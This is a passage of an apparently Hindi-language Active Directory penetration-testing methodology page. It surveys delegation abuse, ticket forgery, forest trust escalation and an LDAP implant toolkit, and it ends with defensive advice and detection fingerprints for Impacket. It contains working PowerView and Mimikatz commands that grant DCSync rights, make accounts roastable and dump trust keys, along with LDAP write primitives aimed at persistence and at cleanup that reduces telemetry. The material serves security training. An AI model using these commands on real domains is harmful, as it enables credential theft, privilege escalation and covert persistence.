> ध्यान दें कि यह काफी **noisy** है और **LAPS** इसे **mitigate** कर देगा।

### MSSQL Abuse & Trusted Links

अगर किसी user के पास **MSSQL instances** को **access** करने के privileges हैं, तो वह इसका उपयोग करके MSSQL host पर **commands execute** कर सकता है (अगर वह SA के रूप में चल रहा हो), **NetNTLM hash steal** कर सकता है या **relay attack** भी कर सकता है।\
साथ ही, अगर किसी MSSQL instance पर किसी दूसरे MSSQL instance का trust (database link) है, और user के पास उस trusted database पर privileges हैं, तो वह **trust relationship का उपयोग करके दूसरे instance पर भी queries execute** कर सकेगा। इन trusts को chain किया जा सकता है और किसी समय user को एक misconfigured database मिल सकता है जहाँ वह commands execute कर सके।\
**Databases के बीच links forest trusts के across भी काम करते हैं।**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory और deployment suites अक्सर credentials और code execution के लिए powerful paths expose करती हैं। देखें:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

अगर आपको किसी Computer object में [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) attribute मिलता है और आपके पास उस computer पर domain privileges हैं, तो आप उस computer में login करने वाले हर user के memory से TGTs dump कर सकेंगे।\
इसलिए, अगर कोई **Domain Admin computer पर login** करता है, तो आप उसका TGT dump करके [Pass the Ticket](pass-the-ticket.md) का उपयोग करके उसकी impersonation कर सकेंगे।\
constrained delegation की मदद से आप even **स्वचालित रूप से एक Print Server compromise** कर सकते हैं (उम्मीद है वह DC होगा)。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

अगर किसी user या computer को "Constrained Delegation" की अनुमति है, तो वह **किसी computer पर कुछ services access करने के लिए किसी भी user की impersonation** कर सकेगा।\
फिर, अगर आप इस user/computer का **hash compromise** कर लेते हैं, तो आप **किसी भी user** (यहाँ तक कि domain admins) की impersonation करके कुछ services access कर सकेंगे।


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

किसी remote computer के Active Directory object पर **WRITE** privilege होने से **elevated privileges** के साथ code execution प्राप्त किया जा सकता है:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Compromised user के पास कुछ domain objects पर कुछ **interesting privileges** हो सकते हैं, जो आपको बाद में privileges **move laterally**/**escalate** करने दे सकते हैं।


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain के भीतर **Spool service listening** का पता लगाना **abused** किया जा सकता है ताकि **new credentials acquire** किए जा सकें और **privileges escalate** किए जा सकें।


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

अगर **other users** compromised machine को **access** करते हैं, तो **memory से credentials gather** करना और यहाँ तक कि उन्हें impersonate करने के लिए उनके processes में **beacons inject** करना संभव है।\
आमतौर पर users system को RDP के जरिए access करेंगे, इसलिए यहाँ आपके पास third party RDP sessions पर कुछ attacks performa करने का तरीका है:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** domain-joined computers पर **local Administrator password** को manage करने के लिए एक system प्रदान करता है, यह सुनिश्चित करते हुए कि यह **randomized**, unique, और frequently **changed** हो। ये passwords Active Directory में store होते हैं और access ACLs के माध्यम से केवल authorized users तक सीमित होता है। यदि इन passwords को access करने के लिए पर्याप्त permissions हों, तो दूसरे computers की ओर pivoting संभव हो जाती है।


{{#ref}}
laps.md
{{endref}}

### Certificate Theft

Compromised machine से **certificates gather** करना environment के अंदर privileges escalate करने का एक तरीका हो सकता है:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

अगर **vulnerable templates** configured हैं, तो उन्हें abuse करके privileges escalate करना संभव है:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार जब आपके पास **Domain Admin** या उससे भी बेहतर **Enterprise Admin** privileges आ जाएँ, तो आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[**DCSync attack के बारे में अधिक जानकारी यहाँ मिल सकती है**](dcsync.md).

[**NTDS.dit को steal करने के तरीके के बारे में अधिक जानकारी यहाँ मिल सकती है**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

ऊपर चर्चा की गई कुछ techniques persistence के लिए इस्तेमाल की जा सकती हैं।\
उदाहरण के लिए आप यह कर सकते हैं:

- Users को [**Kerberoast**](kerberoast.md) के लिए vulnerable बनाना

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Users को [**ASREPRoast**](asreproast.md) के लिए vulnerable बनाना

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- किसी user को [**DCSync**](#dcsync) privileges देना

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** किसी specific service के लिए **NTLM hash** (उदाहरण के लिए, **PC account का hash**) का उपयोग करके एक **legitimate Ticket Granting Service (TGS) ticket** बनाता है। इस method का उपयोग **service privileges access** करने के लिए किया जाता है।


{{#ref}}
silver-ticket.md
{{endref}}

### Golden Ticket

**Golden Ticket attack** में attacker Active Directory (AD) environment में **krbtgt account के NTLM hash** तक access प्राप्त करता है। यह account खास है क्योंकि इसका उपयोग सभी **Ticket Granting Tickets (TGTs)** sign करने के लिए होता है, जो AD network में authenticate करने के लिए essential हैं।

एक बार attacker को यह hash मिल जाए, तो वह अपनी पसंद के किसी भी account के लिए **TGTs** बना सकता है (Silver ticket attack)।


{{#ref}}
golden-ticket.md
{{endref}}

### Diamond Ticket

ये golden tickets जैसे होते हैं, लेकिन इस तरह forged किए जाते हैं कि वे **common golden tickets detection mechanisms को bypass** कर दें।


{{#ref}}
diamond-ticket.md
{{endref}}

### **Certificates Account Persistence**

किसी account के certificates होना या उन्हें request कर पाने में सक्षम होना, user account में persist रहने का बहुत अच्छा तरीका है (भले ही वह password बदल दे):


{{#ref}}
ad-certificates/account-persistence.md
{{endref}}

### **Certificates Domain Persistence**

**Certificates का उपयोग domain के अंदर high privileges के साथ persist रहने के लिए भी किया जा सकता है:**


{{#ref}}
ad-certificates/domain-persistence.md
{{endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object **privileged groups** (जैसे Domain Admins और Enterprise Admins) की security सुनिश्चित करता है, इन groups पर एक standard **Access Control List (ACL)** लागू करके unauthorized changes को रोकता है। हालांकि, इस feature का misuse किया जा सकता है; अगर attacker AdminSDHolder की ACL को modify करके किसी regular user को full access दे दे, तो वह user सभी privileged groups पर extensive control हासिल कर लेता है। यह security measure, जो protection के लिए है, इसलिए उल्टा भी पड़ सकता है और closely monitored न होने पर unwarranted access दे सकता है।

[**AdminDSHolder Group के बारे में अधिक जानकारी यहाँ।**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** के अंदर एक **local administrator** account मौजूद होता है। ऐसी machine पर admin rights प्राप्त करके, **mimikatz** का उपयोग करते हुए local Administrator hash निकाला जा सकता है। इसके बाद, इस password के use को **enable** करने के लिए registry modification आवश्यक है, जिससे local Administrator account तक remote access संभव हो जाता है।


{{#ref}}
dsrm-credentials.md
{{endref}}

### ACL Persistence

आप किसी specific domain object पर किसी **user** को कुछ **special permissions** दे सकते हैं, जिससे user भविष्य में **privileges escalate** कर सके।


{{#ref}}
acl-persistence-abuse/
{{endref}}

### Security Descriptors

**Security descriptors** का उपयोग किसी **object** के **over** उसके **permissions** store करने के लिए किया जाता है। अगर आप किसी object के security descriptor में बस थोड़ा सा change कर सकते हैं, तो आप उस object पर privileged group का member बने बिना भी बहुत ही interesting privileges हासिल कर सकते हैं।


{{#ref}}
security-descriptors.md
{{endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class का abuse करके short-lived principals/GPOs/DNS records बनाइए जिनमें `entryTTL`/`msDS-Entry-Time-To-Die` हो; ये tombstones के बिना self-delete हो जाते हैं, LDAP evidence मिटाते हुए orphan SIDs, broken `gPLink` references, या cached DNS responses छोड़ जाते हैं (जैसे AdminSDHolder ACE pollution या malicious `gPCFileSysPath`/AD-integrated DNS redirects)।

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{endref}}

### Skeleton Key

**LSASS** को memory में alter करके एक **universal password** स्थापित करें, जिससे सभी domain accounts तक access मिल जाता है।


{{#ref}}
skeleton-key.md
{{endref}}

### Custom SSP

[यहाँ जानें कि SSP (Security Support Provider) क्या है।](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप अपना **own SSP** बना सकते हैं ताकि machine access करने के लिए उपयोग किए गए **credentials** को **clear text** में **capture** किया जा सके।


{{#ref}}
custom-ssp.md
{{endref}}

### DCShadow

यह AD में एक **new Domain Controller** register करता है और इसका उपयोग specified objects पर **attributes push** करने के लिए करता है (SIDHistory, SPNs...) **बिना** किसी **logs** को छोड़े जो **modifications** से संबंधित हों। आपको **DA** privileges चाहिए और **root domain** के अंदर होना चाहिए।\
ध्यान दें कि अगर आप गलत data का उपयोग करते हैं, तो बहुत ugly logs दिखाई देंगे।


{{#ref}}
dcshadow.md
{{endref}}

### LAPS Persistence

ऊपर हमने discuss किया कि अगर आपके पास **LAPS passwords read** करने के लिए पर्याप्त permission हो, तो privileges कैसे escalate किए जा सकते हैं। हालांकि, इन passwords का उपयोग **maintain persistence** के लिए भी किया जा सकता है।\
देखें:


{{#ref}}
laps.md
{{endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary मानता है। इसका मतलब है कि **एक single domain compromise** होने पर पूरा Forest compromise हो सकता है।

### Basic Information

एक [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है जो एक **domain** के user को दूसरे **domain** के resources access करने देता है। यह मूल रूप से दोनों domains के authentication systems के बीच एक linkage बनाता है, जिससे authentication verifications seamlessly flow कर सकें। जब domains trust set up करते हैं, तो वे अपने **Domain Controllers (DCs)** में कुछ specific **keys** exchange और retain करते हैं, जो trust की integrity के लिए crucial होती हैं।

एक typical scenario में, अगर कोई user किसी **trusted domain** की service access करना चाहता है, तो उसे पहले अपने domain के DC से **inter-realm TGT** नाम का special ticket request करना पड़ता है। यह TGT एक shared **key** से encrypted होता है जिस पर दोनों domains सहमत होते हैं। फिर user इस TGT को **trusted domain के DC** के सामने present करता है ताकि service ticket (**TGS**) मिल सके। inter-realm TGT को trusted domain के DC द्वारा successfully validate किए जाने पर, वह एक TGS issue करता है, जिससे user को service access मिल जाता है।

**Steps**:

1. **Domain 1** में एक **client computer** अपने **NTLM hash** का उपयोग करके अपने **Ticket Granting Ticket (TGT)** के लिए **Domain Controller (DC1)** से request शुरू करता है।
2. अगर client successfully authenticated हो जाता है, तो DC1 एक नया TGT issue करता है।
3. इसके बाद client **Domain 2** के resources access करने के लिए DC1 से एक **inter-realm TGT** request करता है।
4. inter-realm TGT को DC1 और DC2 के बीच two-way domain trust के हिस्से के रूप में shared **trust key** से encrypt किया जाता है।
5. client उस inter-realm TGT को **Domain 2's Domain Controller (DC2)** के पास ले जाता है।
6. DC2 अपनी shared trust key का उपयोग करके inter-realm TGT verify करता है और, अगर valid हो, तो Domain 2 के उस server के लिए **Ticket Granting Service (TGS)** issue करता है जिसे client access करना चाहता है।
7. अंत में, client इस TGS को server के सामने प्रस्तुत करता है, जो server’s account hash से encrypted होता है, ताकि Domain 2 की service तक access मिल सके।

### Different trusts

ध्यान देना महत्वपूर्ण है कि **trust 1 way या 2 ways** हो सकता है। 2-way option में, दोनों domains एक-दूसरे पर trust करेंगे, लेकिन **1-way** trust relation में domains में से एक **trusted** होगा और दूसरा **trusting** domain। आखिरी case में, **आप trusted domain से only trusting domain के resources access कर पाएँगे**।

अगर Domain A, Domain B पर trust करता है, तो A trusting domain है और B trusted one है। इसके अलावा, **Domain A** में यह एक **Outbound trust** होगा; और **Domain B** में यह एक **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह उसी forest के अंदर एक common setup है, जहाँ child domain अपने parent domain के साथ automatically two-way transitive trust रखता है। मूल रूप से, इसका मतलब है कि authentication requests parent और child के बीच seamlessly flow कर सकती हैं।
- **Cross-link Trusts**: इन्हें "shortcut trusts" भी कहा जाता है, और referral processes को तेज करने के लिए child domains के बीच establish किया जाता है। complex forests में, authentication referrals को आमतौर पर forest root तक ऊपर और फिर target domain तक नीचे जाना पड़ता है। cross-links बनाने से यह journey छोटी हो जाती है, जो geographically dispersed environments में खास तौर पर useful है।
- **External Trusts**: ये अलग, unrelated domains के बीच set up किए जाते हैं और स्वभाव से non-transitive होते हैं। [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) के अनुसार, external trusts उस domain के बाहर resources access करने के लिए useful हैं जो current forest में नहीं है और forest trust से connected भी नहीं है। security external trusts के साथ SID filtering द्वारा बढ़ाई जाती है।
- **Tree-root Trusts**: ये forest root domain और newly added tree root के बीच automatically established होते हैं। हालाँकि ये आम तौर पर नहीं मिलते, tree-root trusts forest में नए domain trees जोड़ने के लिए important हैं, जिससे वे unique domain name बनाए रख सकें और two-way transitivity सुनिश्चित हो सके। अधिक जानकारी [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) में मिल सकती है।
- **Forest Trusts**: यह trust का two-way transitive प्रकार है जो दो forest root domains के बीच होता है, और security measures को बेहतर बनाने के लिए SID filtering भी लागू करता है।
- **MIT Trusts**: ये trust गैर-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains के साथ स्थापित किए जाते हैं। MIT trusts थोड़े अधिक specialized होते हैं और Windows ecosystem के बाहर Kerberos-based systems के साथ integration वाले environments के लिए बनाए जाते हैं।

#### Other differences in **trusting relationships**

- एक trust relationship **transitive** (A trust B, B trust C, then A trust C) या **non-transitive** भी हो सकती है।
- एक trust relationship को **bidirectional trust** (दोनों एक-दूसरे पर trust करते हैं) या **one-way trust** (केवल एक दूसरे पर trust करता है) के रूप में set up किया जा सकता है।

### Attack Path

1. trusting relationships को **enumerate** करें
2. जाँचें कि क्या किसी **security principal** (user/group/computer) के पास **other domain** के resources तक **access** है, शायद ACE entries के माध्यम से या other domain के groups में होने के कारण। **domains across relationships** देखें (शायद trust इसी वजह से बनाया गया था)।
1. इस case में kerberoast एक और option हो सकता है।
3. उन **accounts** को **compromise** करें जो domains के बीच **pivot** कर सकते हैं।

Attackers के पास दूसरे domain के resources तक access करने के तीन primary mechanisms हो सकते हैं:

- **Local Group Membership**: Principals को machines पर local groups, जैसे server पर “Administrators” group, में जोड़ा जा सकता है, जिससे उस machine पर substantial control मिल जाता है।
- **Foreign Domain Group Membership**: Principals foreign domain के अंदर groups के members भी हो सकते हैं। हालांकि, इस method की effectiveness trust की nature और group के scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को किसी **ACL** में specify किया जा सकता है, खासकर **DACL** के भीतर **ACEs** के रूप में, जिससे उन्हें specific resources तक access मिलता है। जो लोग ACLs, DACLs, और ACEs के mechanics में और गहराई से जाना चाहते हैं, उनके लिए “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” शीर्षक वाला whitepaper एक invaluable resource है।

### Find external users/groups with permissions

आप domain में foreign security principals खोजने के लिए **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** जाँच सकते हैं। ये **external domain/forest** के user/group होंगे।

आप इसे **Bloodhound** में या powerview का उपयोग करके देख सकते हैं:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
डोमेन trusts को enumerate करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> वहाँ **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरा _Parent_ --> _Child_ के लिए।\
> आप वर्तमान domain द्वारा उपयोग की जाने वाली key को इनके साथ देख सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

trust में SID-History injection का abuse करके Enterprise admin तक escalate करें:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC) का exploit कैसे किया जा सकता है, इसे समझना crucial है। Configuration NC, Active Directory (AD) environments में पूरे forest के लिए configuration data का central repository होता है। यह data forest के हर Domain Controller (DC) में replicate होता है, और writable DCs Configuration NC की writable copy बनाए रखते हैं। इसे exploit करने के लिए, किसी के पास **SYSTEM privileges on a DC** होना चाहिए, preferably एक child DC पर।

**Link GPO to root DC site**

Configuration NC का Sites container, AD forest के भीतर सभी domain-joined computers की sites की information रखता है। किसी भी DC पर SYSTEM privileges के साथ operate करके, attackers GPOs को root DC sites से link कर सकते हैं। यह action इन sites पर लागू policies को manipulate करके root domain को potentially compromise कर सकता है।

गहराई से जानकारी के लिए, [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) पर research देखी जा सकती है।

**Compromise any gMSA in the forest**

एक attack vector privileged gMSAs को target करने से जुड़ा है। KDS Root key, जो gMSAs' passwords calculate करने के लिए essential है, Configuration NC में stored होती है। किसी भी DC पर SYSTEM privileges के साथ, KDS Root key access करना और पूरे forest में किसी भी gMSA के passwords compute करना possible है।

Detailed analysis और step-by-step guidance यहाँ देखी जा सकती है:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – migration attributes का abuse):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

इस method के लिए patience चाहिए, नए privileged AD objects के creation का wait करना होता है। SYSTEM privileges के साथ, attacker AD Schema को modify करके किसी भी user को सभी classes पर complete control grant कर सकता है। इससे newly created AD objects पर unauthorized access और control मिल सकता है।

Further reading [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent) पर उपलब्ध है।

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability Public Key Infrastructure (PKI) objects पर control target करती है ताकि एक certificate template बनाया जा सके जो forest के भीतर किसी भी user के रूप में authentication enable करे। चूँकि PKI objects Configuration NC में reside करते हैं, एक writable child DC compromise करना ESC5 attacks को execute करने देता है।

इस पर अधिक details [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) में पढ़ी जा सकती हैं। ADCS न होने वाले scenarios में, attacker के पास आवश्यक components set up करने की capability होती है, जैसा कि [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) में discussed है।

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
इस scenario में **आपका domain trusted** है एक external one के द्वारा, जो आपको उस पर **undetermined permissions** देता है। आपको यह पता लगाना होगा कि **आपके domain के कौन से principals के पास external domain पर कौन सा access है** और फिर उसका exploit करने की कोशिश करनी होगी:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### External Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
इस परिदृश्य में **आपका domain** **different domains** से principal को कुछ **privileges** **trusting** कर रहा है।

हालांकि, जब trusting domain द्वारा एक **domain trusted** होता है, तो trusted domain एक **user** बनाता है जिसका **predictable name** होता है और जिसे **password** के रूप में **trusted password** का उपयोग किया जाता है। इसका मतलब है कि trusting domain के एक user से access करके trusted domain के अंदर जाना संभव है, ताकि उसे enumerate किया जा सके और अधिक privileges escalate करने की कोशिश की जा सके:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain को compromise करने का एक और तरीका है विपरीत दिशा में बनाए गए [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) को खोजना (जो बहुत common नहीं है)।

trusted domain को compromise करने का एक और तरीका है ऐसी machine पर wait करना जहाँ **trusted domain का user access कर सकता है** और **RDP** के जरिए login करना। फिर attacker RDP session process में code inject कर सकता है और वहाँ से victim के **origin domain** तक access कर सकता है।\
इसके अलावा, अगर **victim ने अपनी hard drive mount** की हो, तो **RDP session** process से attacker hard drive के **startup folder** में **backdoors** store कर सकता है। इस technique को **RDPInception.** कहा जाता है


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- SID history attribute का उपयोग करके forest trusts के across attacks का risk SID Filtering द्वारा mitigate किया जाता है, जो सभी inter-forest trusts पर default रूप से activated होता है। यह इस assumption पर आधारित है कि intra-forest trusts secure हैं, और Microsoft की stance के अनुसार forest को domain के बजाय security boundary माना जाता है।
- हालांकि, एक catch है: SID filtering applications और user access को disrupt कर सकता है, जिससे इसे कभी-कभी deactivate करना पड़ता है।

### **Selective Authentication:**

- Inter-forest trusts के लिए, Selective Authentication का उपयोग यह सुनिश्चित करता है कि दोनों forests के users automatically authenticated न हों। इसके बजाय, users को trusting domain या forest के अंदर domains और servers तक access करने के लिए explicit permissions की आवश्यकता होती है।
- यह ध्यान देना महत्वपूर्ण है कि ये measures writable Configuration Naming Context (NC) के exploitation या trust account पर attacks से सुरक्षा नहीं देते।

[**Domain trusts के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## On-Host Implants से LDAP-based AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में re-implements करता है जो पूरी तरह on-host implant (जैसे, Adaptix C2) के अंदर चलते हैं। Operators pack को `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` से compile करते हैं, `ldap.axs` load करते हैं, और फिर beacon से `ldap <subcommand>` call करते हैं। सभी traffic current logon security context को LDAP (389) over signing/sealing या LDAPS (636) with auto certificate trust के जरिए ले जाता है, इसलिए socks proxies या disk artifacts की आवश्यकता नहीं होती।

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, और `get-groupmembers` short names/OU paths को full DNs में resolve करते हैं और संबंधित objects dump करते हैं।
- `get-object`, `get-attribute`, और `get-domaininfo` arbitrary attributes (security descriptors सहित) के साथ-साथ `rootDSE` से forest/domain metadata pull करते हैं।
- `get-uac`, `get-spn`, `get-delegation`, और `get-rbcd` roasting candidates, delegation settings, और existing [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors को सीधे LDAP से expose करते हैं।
- `get-acl` और `get-writable --detailed` DACL को parse करके trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance की सूची बनाते हैं, जिससे ACL privilege escalation के लिए तुरंत targets मिलते हैं।
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### एस्केलेशन & persistence के लिए LDAP write primitives

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operator को नए principals या machine accounts stage करने देते हैं, जहाँ भी OU rights मौजूद हों। `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे targets को hijack करते हैं, जैसे ही write-property rights मिलते हैं।
- ACL-focused commands जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` किसी भी AD object पर WriteDACL/WriteOwner को password resets, group membership control, या DCSync replication privileges में बदल देते हैं, बिना PowerShell/ADSI artifacts छोड़े। `remove-*` counterparts injected ACEs को साफ़ करते हैं।

### Delegation, roasting, और Kerberos abuse

- `add-spn`/`set-spn` तुरंत किसी compromised user को Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) password को छुए बिना उसे AS-REP roasting के लिए mark करता है।
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को beacon से rewrite करते हैं, जिससे constrained/unconstrained/RBCD attack paths enable होते हैं और remote PowerShell या RSAT की जरूरत खत्म हो जाती है।

### sidHistory injection, OU relocation, और attack surface shaping

- `add-sidhistory` नियंत्रित principal की SID history में privileged SIDs inject करता है (देखें [SID-History Injection](sid-history-injection.md)), जिससे stealthy access inheritance पूरी तरह LDAP/LDAPS के जरिए मिलती है।
- `move-object` computers या users का DN/OU बदलता है, जिससे attacker assets को उन OUs में drag कर सकता है जहाँ delegated rights पहले से मौजूद हों, फिर `set-password`, `add-groupmember`, या `add-spn` का abuse कर सकता है।
- Tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, आदि) operator के credentials या persistence harvest करने के बाद तेज rollback की अनुमति देती हैं, जिससे telemetry कम होती है।

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## कुछ सामान्य Defenses

[**यहाँ credentials को protect करने के बारे में अधिक जानें.**](../stealing-credentials/credentials-protections.md)

### **Credential Protection के लिए Defensive Measures**

- **Domain Admins Restrictions**: सलाह दी जाती है कि Domain Admins को केवल Domain Controllers पर login करने दिया जाए, और उनका उपयोग अन्य hosts पर न किया जाए।
- **Service Account Privileges**: सुरक्षा बनाए रखने के लिए services को Domain Admin (DA) privileges के साथ run नहीं करना चाहिए।
- **Temporal Privilege Limitation**: DA privileges वाली tasks के लिए उनकी duration सीमित होनी चाहिए। यह इस तरह किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event IDs 2889/3074/3075 audit करें और फिर DCs/clients पर LDAP signing plus LDAPS channel binding enforce करें ताकि LDAP MITM/relay attempts block हों।

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity का Protocol-level fingerprinting

अगर आप common AD tradecraft detect करना चाहते हैं, तो केवल operator-controlled artifacts जैसे renamed binaries, service names, temp batch files, या output paths पर भरोसा **न करें**। देखें कि legitimate Windows clients [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, और WMI traffic कैसे बनाते हैं, फिर **implementation quirks** खोजें जो `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, या `ntlmrelayx.py` edit करने के बाद भी बने रहते हैं।

- **High-confidence standalone candidates** (अपनी baseline के खिलाफ validate करने के बाद):
- Authenticated DCE/RPC `auth_context_id = 79231 + ctx_id` का उपयोग
- DCE/RPC authentication padding का `0xff` से भरा होना
- LDAP Kerberos binds जो raw Kerberos `AP-REQ` को सीधे SPNEGO `mechToken` में रखते हैं
- SMB2/3 negotiate requests जिनमें ASCII-like `ClientGuid` values हों
- WMI `IWbemLevel1Login::NTLMLogin` का non-standard namespace `//./root/cimv2` उपयोग
- Hardcoded Kerberos nonce values
- **Correlation/scoring features के रूप में बेहतर**:
- Sparse या duplicated Kerberos etype lists, unusual/missing `PA-DATA`, या TGS-REQ etype ordering जो native Windows से अलग हो
- NTLM Type 1 messages जिनमें version info न हो या Type 3 messages जिनमें null host names हों
- Raw NTLMSSP जो DCE/RPC में SPNEGO की जगह carried हो, missing DCE/RPC verification trailers, या SPNEGO/Kerberos OID mismatches
- एक ही host/user/session/time window से इनमें से कई traits single weak field से कहीं अधिक मजबूत होते हैं
- **Enrichment के रूप में उपयोग करें, standalone alerts के रूप में नहीं**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, और tool-specific HTTP/WebDAV/RDP/MSSQL strings
